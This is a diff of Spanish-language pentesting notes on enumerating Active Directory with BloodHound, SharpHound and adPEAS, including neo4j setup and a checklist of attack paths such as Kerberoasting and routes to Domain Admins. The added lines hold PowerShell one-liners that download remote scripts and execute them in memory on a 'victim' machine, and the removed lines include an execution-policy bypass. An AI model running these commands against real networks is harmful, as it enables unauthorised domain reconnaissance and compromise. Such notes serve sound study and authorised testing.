@@ -4,25 +4,28 @@ Tags: #AD #Powershell #Windows #Enumeracion #BloodHound
 
 Bloodhound es una app en JavaScript la cual puede identificar fácilmente ataques altamente complejo que de otro modo seria imposible identificar ademas puede identificar grupos con permisos excesivos. Los defensores pueden usar Bloohound para identificar y eliminar esas mismas rutas de ataque. 
 
-## SharpHound
+## SharpHound 
 
-```bash 
-# Descargamos la utilidad en nuestra maquina de atacante para despues pasar el archivo a la maquina victima que esta utilizando PowerShell
+* [SharpHound](https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.ps1)
+* [SharpHound](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1)
 
-❯ wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1 
+```powershell
+❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1'); 
+❯ Invoke-BloodHound -CollectionMethod All     
+
+Nota: Estos comandos los ejecutamos en la maquina victima Windows para recolectar la información y obtener un archivo '.zip' el cual pasaremos a la herramienta de 'BloodHound' para el analisis 
 ```
 
+## ADPeas
+
+* [ADPeas](https://github.com/61106960/adPEAS)
+
 ```powershell 
-# En la maquina victima con PS. Hacemos lo siguiente para la recoleccion de data
+❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')
 
-❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
- 	# ep = Ejecutar politicas 
+❯ Invoke-adPEAS    # Módulo para hacer la enumeración automatizada
 
-# Enumeracion 
-❯ . .\SharpHound.ps1                         # Importamos el modulo 
-❯ Import-Module .\SharpHound.ps1             # Otra forma de importar el modulo  
-
-❯ Invoke-Bloodhound -CollectionMethod All    # Utilizamnos la funcion 'Invoke' para crear el archivo  '2024_bloodhound.zip' el cual usaremos en el GUI de la herramienta de Boolhound
+Nota: Podemos usar ADPeas para hacer la recolección ya que automaticamente ejecuta 'SharpHound'
 ```
 
 ## Subir Data por Python a BloodHound
@@ -54,17 +57,25 @@ Nota: La herramienta regresará un archivo '.zip' que se debe cargar en 'BloodHo
 * [Neo4j-installation](https://neo4j.com/docs/operations-manual/current/installation/linux/debian/)
 
 ```bash 
-❯ neo4j console &> /dev/null & disown      # Iniciamos el servicio en el puerto local '7474' y lo independizamos
+❯ sudo neo4j console &> /dev/null & disown      # Iniciamos el servicio en el puerto local '7474' y lo independizamos
 
-Nota: Si es la primera vez que lo usamos, abrimos la web 'localhost:7474' y agregamos las credenciales 'neo4j:neo4j', despues, agregamos una passwd nueva y asi podremos conectarnos al 'Bloodhound'
+❯ ./BloodHound --no-sandbox & disown            # Ejecutar como usuario 'root' 
+❯ bloodhound &> /dev/null & disown              # Ejecutar 'Bloodhound' e independizarlo
 
+Notas: 
+	1. Si es la primera vez que se usa, abrir la web 'localhost:7474', agregar las credenciales 'neo4j:neo4j', despues, colocar una nueva passwd y conectarse al 'Bloodhound'
+	2. El 'CustomQueries.json' se descarga y se copia en la carpeta donde esta instalado 'BloodHound'
+```
 
-❯ ./BloodHound --no-sandbox             # Ejecutar como usuario 'root' 
-❯ bloodhound &> /dev/null & disown      # Ejecutar 'Bloodhound' e independizarlo
-
-Nota:
-	1. Para subir info de un archivo '.zip' se debe usar 'Upload Data'
-	2. Para subir info de archivos 'Json' se debe usar 'Import Graph'
+```bash 
+Identificar lo siguiente en BloodHound:
+	1. Identificación de 'Doman Admins'
+	2. Identificación de 'usuarios Kerberoasteables'
+	3. Identificación de 'usuarios AS-REP Roastable'
+	4. Identificación de vectores de ataque 'Find Shortest Paths to Domain Admins'
+	5. Identificación de 'Unsconstrained Delegation'
+	6. Identificación de usuarios con permisos sobre GPO 'Find if any domain user has interesting against aGPO'
+	7. 
 ```
 
 ## Ataques 'DCSync'
